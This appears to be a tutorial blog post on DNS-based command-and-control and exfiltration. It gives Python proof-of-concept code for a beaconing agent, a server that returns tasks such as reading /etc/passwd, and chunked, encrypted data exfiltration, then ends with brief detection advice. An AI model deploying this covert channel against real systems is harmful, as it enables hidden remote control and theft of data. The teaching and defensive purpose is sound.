# Weaponized DNS: Resolving remote commands

DNS (Domain Name System) is a network protocol that resolves domain names into IP addresses. It works as a translator to make internet communication easy because IP addresses aren't human-readable and are hard to remember, unlike domains. For an easy way to understand how it works, remember each time that you use a web explorer.

When we can enter a web page, we type the domain name into the web explorer, for example `google.com`, and then the explorer sends it to a DNS server that initiates the resolve process, sometimes sending additional requests to other DNS servers if the first one doesn't have domain data in cache. When the domain is resolved, the DNS server returns the response with the IP corresponding to that domain. Now with the IP, the explorer knows where to send the next petitions to talk with the web page server.

As with other network protocols, the request has a specific syntax; for DNS resolve requests, the full name, or FQDN, looks like this one `something.mydomain.com`. It can be divided into three parts:

- **TLD (Top Level Domain):** .com
- **SLD (Second Level Domain):** .mydomain
- **Subdomain:**  something

In addition to FQDN we need to send **Type** for our case we'll use:
- **A:** Resolves domainsto IPv4 address
- **AAAA:** Resolves domains to IPv6 address
- **TXT:** Records arbitrary text

And the class in this request we use class **IN**, which means internet. With this data the DNS server knows what and where to resolve the domains. This is a simple explication of how DNS works with the need to understand the following information. To learn the protocol in deep, you can read the following Cloudflare article: [Cloudflare DNS reference]([https://www.cloudflare.com/learning/dns/what-is-dns/](https://www.cloudflare.com/learning/dns/what-is-dns/))

But why use DNS in offensive activities? [Mittre ATT&CK T1071.004]([https://attack.mitre.org/techniques/T1071/004/](https://attack.mitre.org/techniques/T1071/004/)), Well this protocol is essential to keep a lot of applications and servers working in modern systems; it means that blocking the protocol or their port (53 by default) is not a good idea. Because applying this measure can stop some network system activities, and seeing DNS communications in a network sniffer is very common and not suspicious (bysome C2 agents use the DNS protocol to exfiltrate information, bypassing some detection using the "normal" traffic instead of weird ports or protocols that trigger alerts.

**Mittre ATT&CK reference:** [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048/)


> **Note:** Some of the modern security systems, like EDRs, can detect unusual DNS requests, but it's a less common scenario.

In resume of the DNS explication above, the elements needed to use DNS are:
- DNS Client (C2 agent)
- DNS Server (C2 server listener)
- FQDN

In an offensive scenario the agent recopilates target information and exfiltrates it through the FQDN, and a listener active in the C2 server works as a DNS server resolving the "domain name" that contains exfiltrated data. Also, agents can use resolve requests to get execution tasks in target devices using beaconing techniques.

The communications between the C2 server and agents through DNS don't have a single way of operating; rather, they depend on the C2 server. They can change with the server version. A common way to use it is: 

1. sending periodic DNS requests (A or AAAA), called callbacks, that say to the server that the agent connection is alive
2. If the server has a pending task for the agent, it returns a task to be executed on the target device.
3. The agent receives the task in a TXT record and executes it in the target, collecting the data from the task result.
4. The agent exfiltrates data with one or more DNS requests depending on the exfiltrating data.
5. The C2 server takes the incoming DNS request with the exfiltrated data and records it to the corresponding agent.

The syntax of the FQDN can change based on the C2 used, but in this case we use the following:

> All the data sent is encrypted and decoded in base64 to avoid bad chars for the FQDN

**Request syntax:** `<ba64_encoded_data>.<domain>`

The syntax is the same for all requests, but the payload data sent changes depending on the agent request type (callback or data exfiltration). The payload itself indicates to the server what action needs to be done with the input request, for example:

**Callback request:**

- **Payload:** agent identifier
- **Example:** agent01.mydomain.com
- **No task response:** `[NOTHING]`

**Callback response:**
- **Payload:** `<message_id>:<task command>`
- **Example:** `812960: cat /etc/passwd`

**Exfiltration request:**

- **Payload:** is a json with the following data
	- **agent_id:** Client ID
	- **message_id:** Transaction ID linked to the executed task
	- **chunk_index:** Index to specify the position of each chunk in the assembled data
	- **size:** Total size of exfiltrated data, to check when data is fully loaded
	- **data:** base64 encoded data part

**Plain json payload example:**
```json
    {
        "agent_id": agent01,
        "message_id": 1,
        "chunk_index": 0,
        "size": 32,
        "data": "ZG9uJ3QgZGVjcnlwdCBtZSBiaXRjaA=="
    }
```

In this case chunks are used because FQDNs have a limited size of 255 characters and each FQDN label (parts separated by a dot) has a limited size of 63 characters without the ".", which makes it necessary to divide the data into chunks with the needed size. Then **message_id** identifies the transaction of the exfiltration messages and helps the server to link with the corresponding agent task, and **chunk_index** and **size** are used to assemble data in the server.

## Practice example

There is a [Github repository]([https://github.com/0z4i/DNS_exfiltration](https://github.com/0z4i/DNS_exfiltration)) developed by me, with a simple DNS server and client as a PoC to show how information exfiltration works with this network protocol. Let's break it down: the server and the agent were built on Python 3 using the modules **pycryptodome** and **dnslib**.

The client can be built with other languages or technologies, but for a quick demonstration this is created in Python, because in a real scenario a C2 agent created in Python 3 **will be detected by any security system or can't be executed if** the file is analyzed. On the other hand, the server can be in Python also in real scenarios.

Data can be stored in a DB like Mongo, but for a **quick demo,** this example stores message results in a local JSON file.

The server needs a basic configuration as the following:

```python
SERVER_PORT = 5353
SERVER_ADDRESS = "0.0.0.0"
EXPECTED_DOMAIN = "domain.local"
```

Check that **SERVER_PORT** here is 5353, because port 53 is reserved and requires root permissions, but using port 53 is possible by running the script with sudo. **SERVER_ADDRESS** uses 0.0.0.0 to catch DNS requests in all network interfaces; to catch only the local network, change it to 127.0.0.1, and finally **EXPECTED_DOMAIN** is the domain name (TLD and SLD) that the server will resolve and ignore the rest.

This configured data is used in the client to send the requests to the server. Based on a specific time interval, the client sends the callback request to the server to check for pending tasks (beaconing).

To create the callback request FQDN, the client uses an **agent_id**. This is used for the server to identify what agent session is talking with it. All the data sent to the server have an AES encryption and a base64 encoding to avoid using bad characters for the FQDN. In this specific demo scenario, this is done with this method.

The client **uses the server IP as the server resolver** because if the IP of the resolver is not specified, the request will be sent to the DNS configured in the client computer, router, or provided by the ISP by default.

> All the client request in this demo are sent as AAAA type

```python
# returns: ZG9uJ3QgZGVjcnlwdCBtZSBiaXRjaA==.domain.local

# Create FQDN for callback request

def build_callback(agent_id):
    encrypted = encrypt_string(AES_KEY, agent_id)
    request = f"{encrypted}.{DOMAIN}"

    return request
    

def send_request(request):
    timeout = 10
    q = DNSRecord.question(request, RR_TYPE)
    packet = q.pack()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    sock.sendto(packet, (SERVER, PORT))

    try:
        data, _ = sock.recvfrom(EDNS0)
        reply = DNSRecord.parse(data)

        for rr in reply.rr:
            if rr.rtype == QTYPE.TXT:
                response_data = rr.rdata.data
                decoded_response = decode_response(response_data)
                return decoded_response
        return None
    
    except socket.timeout:
        print("[X] Timeout error from DNS server")
        return None
    finally:
        sock.close()
```

When this request is received by the server, first check that the FQDN has the **EXPECTED_DOMAIN** to filter incoming requests. If this domain is not sent, the server responds as a generic response in a **TXT record**.

For a valid request, the server handles the data, decodes the base64, and decrypts the AES, then checks for the request type (callback or exfiltration). If the request is a callback, the server takes the **agent_id** to update the last time of connection and check for pending tasks.

If there is a pending task, the server responds with the agent task also encrypted and encoded in a **TXT record.**

```txt
For: cat /etc/passwd
Encodedpayload: MjI3NDRhYjIzNTU0N2M0YzRhYmVkMDk2ZGE1YTdmYmQyNWQzZjY4OWQ2ZjE4ZDlkOTc4MTc4ZWI0NjRkYmRiZg
```

The encoded response is fragmented in chunks of 255 bytes because this is the limit for the single **TXT records**. When this is handled in the client, it assembles the **TXT record** chunks in a single b64 string to be decoded and decrypted.

```python

# Specific callback handle method

def take_callback(agent_id):
    update_callback(agent_id)
    current_task = get_task(agent_id)

    SESSIONS = read_json_file(SESSIONS_DATA)

    formated_response = current_task

    if current_task != NO_TASK_RESPONSE:
        message_id = random.randint(1, 1_000_000)
        formated_response = f"{str(message_id)}:{current_task}"
        init_message(agent_id, message_id, current_task)

    encoded_task = encrypt_string(AES_KEY, formated_response)

    return encoded_task

# Handle request methods

def handle(head):
    decrypted_data = decode_fqdn(head)
    is_callback = not is_json(decrypted_data)

    response = ""

    if is_callback:
        response = take_callback(decrypted_data)
    else: 
        response = take_chunk(decrypted_data)

    return response

# Main resolver method

    def resolve(self, request, handler):
        q = request.q
        qname = str(q.qname).rstrip('.')
        reply = request.reply()

        is_valid_request, fqdn = check_request(qname)

        if not is_valid_request:
            reply.add_answer(RR(q.qname, QTYPE.TXT, rdata=TXT(["PONG"])))
            return reply

        raw_response = handle(fqdn)
        chunked_response = str_to_chunks(raw_response)

        reply.add_answer(RR(q.qname, QTYPE.TXT, rdata=TXT(chunked_response)))
        return reply
```

If the received payload has a pending task, the agent executes it and collects the result; after that, it encodes it in b64, but that encoded data needs to be separated into chunks, each of which is added to an envelope with this format:

```json
    {
        "agent_id": agent01,
        "message_id": 1,
        "chunk_index": 0,
        "size": 32,
        "data": "ZG9uJ3QgZGVjcnlwdCBtZSBiaXRjaA=="
    }
```

The envelope is fragmented to comply with the FQDN label size limit (63 chars). When the server has all the exfiltration FQDNs generated, they are randomized to send all with a random order; it can be used if some defender catches the outgoing traffic.

In the server the chunks are received and, based on **message_id,** are stored. Its value works as a **transaction ID,** and **chunk_index** is used to order the chunk in the correct order. **size** indicates the full data size to check when all the data has been received.

```python
def assemble_data(message_data):
    chunks = message_data["chunks"]
    sorted_indexes = sorted(chunks.keys(), key=int)
    assembled_b64 = ''.join(chunks[i] for i in sorted_indexes)
    decoded_data = b64_decode(assembled_b64).decode()

    return decoded_data

def take_chunk(data):
    response = encrypt_string(AES_KEY, "[NEXT]")
    SESSIONS = read_json_file(SESSIONS_DATA)
    chunk = json.loads(data)

    agent_id = chunk["agent_id"]
    message_id = str(chunk["message_id"])
    chunk_index = str(chunk["chunk_index"])
    chunk_data = chunk["data"]
    chunk_size = len(chunk_data)

    agent_session = SESSIONS[agent_id]
    message_data = agent_session["messages"][message_id]
    
    if message_data["load_size"] == 0:
        message_data["load_size"] = chunk["size"]

    message_data["chunks"][chunk_index] = chunk_data
    message_data["loaded_size"] = message_data["loaded_size"] + chunk_size

    is_completed = message_data["loaded_size"] == message_data["load_size"]

    if is_completed:
        assembled_data = assemble_data(message_data)
        message_data["data"] = assemble_data(message_data)
        del message_data["chunks"]
        del message_data["loaded_size"]
        del message_data["load_size"]

    agent_session["messages"][message_id] = message_data
    SESSIONS[agent_id] = agent_session

    write_in_json(SESSIONS_DATA, SESSIONS)
    update_callback(agent_id)

    return response
```

If the chunk exfiltration (load) is completed, the server stores the result of each task in the corresponding agent and message; it makes it possible to show data in a graphic interface if there is one.
**Insert demostration video**

![demo](https://github.com/user-attachments/assets/1d3eb8c2-89c1-42c0-9867-7f08dc726158)

## Detection and Mitigation

How do you detect and mitigate these techniques? , first to detect network packets can be analyzed to detect suspicious patterns, for example, and anomalous syntax, like the generated **FQDN** in the example above; checking for rare responses can help to detect these malicious activities. because an **A** or **AAAA** request should be responded to with **IPv4** or **IPv6** and not with other data, and it isn't common that a normal client sends a request with encoded labels.

Checking the request destination may reveal an **Indicator of Compromise** (IOC) based on the IP and not only on the domain, because some agents use domain names similar to normal sites or CDN services to send requests.

To avoid these activities, filter the network traffic to mark some domains or IPs as untrusted, disrupting the attackers' activities ([MITRE M1037]([https://attack.mitre.org/mitigations/M1037](https://attack.mitre.org/mitigations/M1037))). Also, the implementation of intrusion detection systems can detect malicious activities at the network level based on signatures that identify traffic for specific malware or threat actors ([MITRE M1031]([https://attack.mitre.org/mitigations/M1031](https://attack.mitre.org/mitigations/M1031)))
